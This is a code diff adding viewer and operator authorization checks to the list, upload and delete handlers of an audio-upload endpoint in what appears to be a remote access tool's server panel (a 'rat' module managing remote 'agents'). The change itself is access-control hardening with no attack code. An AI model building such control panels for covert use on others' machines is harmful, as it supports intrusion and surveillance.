@@ -5,6 +5,7 @@ import { writeFile } from 'node:fs/promises';
 import { join } from 'node:path';
 import { audioBridgeManager } from '$lib/server/rat/audio';
 import type { AudioUploadTrack } from '$lib/types/audio';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 
 function sanitizeFilename(input: string): string {
 	return (
@@ -15,20 +16,25 @@ function sanitizeFilename(input: string): string {
 	);
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
+
 	const uploads = audioBridgeManager.listUploads(id);
 	return json({ uploads });
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireOperator(locals.user);
 
 	const formData = await request.formData();
 	const file = formData.get('file');
@@ -63,11 +69,13 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	return json({ track: created, uploads }, { status: 201 });
 };
 
-export const DELETE: RequestHandler = async ({ params, request }) => {
+export const DELETE: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireOperator(locals.user);
 
 	let payload: Record<string, unknown> = {};
 	try {
